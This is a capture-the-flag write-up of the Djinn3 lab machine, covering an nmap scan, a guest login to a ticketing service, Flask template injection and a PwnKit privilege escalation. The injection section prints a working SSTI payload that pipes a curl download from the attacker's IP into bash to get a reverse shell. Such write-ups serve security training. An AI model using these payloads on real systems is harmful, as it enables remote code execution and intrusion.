# Djinn3

## Enumeration&#x20;

### Nmap scan&#x20;

```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:ec:e8:c9:df:d5:10:9a:ae:ee:95:c6:9b:ad:52:7f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnooCwDACdtXXqOoUQRigbcdFWNvo24AV/EfyCl/C6EwMxyujzFiRb0vLo9pWWVkttFSy6xnpqnDUfv+AYrJ2wAl5hOGAzMeoe6VOEBxikh7VPZxZT5tDZR1pcsszNPeZrOVdrv/m5Khqb8l6BjEJkjR9+HLnr8focd4tve7HHzbNlHV152ihbm/coT8JyILAmVBeKspMsyyOaX5+c/10O6lpPsK/Ss+fNuMMe1DQSiIh6I5FTYOhjGa9+WoT/PTVYhqu2iq91MElEqIpGCEaM+aJpx0EOJVHksRvYYL5ER81axYq38tyeYv9QMPF+JHtJj/s2OT2/610B/XoKPW2j
|   256 3d:25:50:75:f4:8f:44:90:62:9a:c1:8b:4e:c3:5a:4a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBcYNx/MlexgOyYOZrHK5YKtQfYz00I1knxzz0TLXgt2EsEw9rk0GDofOvW6rvtrfRI05taJO/tos5ucKSVPStU=
|   256 02:75:95:36:97:35:e6:e5:83:a9:a3:bd:2a:49:8b:1a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKRNuSyU1dM+Ib9X3eObqG07jxTLTnxBjkVbONfBPNe3
80/tcp    open  http    syn-ack ttl 61 lighttpd 1.4.45
|_http-title: Custom-ers
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: lighttpd/1.4.45
5000/tcp  open  http    syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31337/tcp open  Elite?  syn-ack ttl 61
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
|     username>
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     username> password> authentication failed
|   Help: 
|     username> password>
|   RPCCheck: 
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
|   SSLSessionReq: 
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
|   TerminalServerCookie: 
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
```



### Port 80,5000 - HTTP

Nothing interesting on port 80. Port 5000 had some kind of ticketing app, still under development it seems. Has a list of tickets with IDs, titles, and status gonna dig into this next since it's flagged as "under development."

<figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>

While going through the ticket IDs, noticed that the `guest` user has access to the ticketing server.

<figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>



### Port 31337&#x20;

Found port 31337 open, connected with netcat and logged in with guest/guest turned out to be a text-based menu for the same ticketing system, with options to open/close tickets and update the software. Tried SSTI in the "open ticket" field since the web app runs on Flask `{{7*7}}` came back as `49`, confirming the injection, and from there escalated to RCE.

<figure><img src="../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>



#### SSTI Vulnerability check

```
{{7*7}}

rce - 
{{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.200.112.255/revshell | bash').read()}}


can do id, whoami, those commands too 

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```



<figure><img src="../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation&#x20;

Found `pkexec` listed in SUID binaries vulnerable to CVE-2021-4034 (Polkit pkexec local privesc). Grabbed a self-contained exploit for it from GitHub and ran it to get root.

<figure><img src="../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>

#### PoC exploit - [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
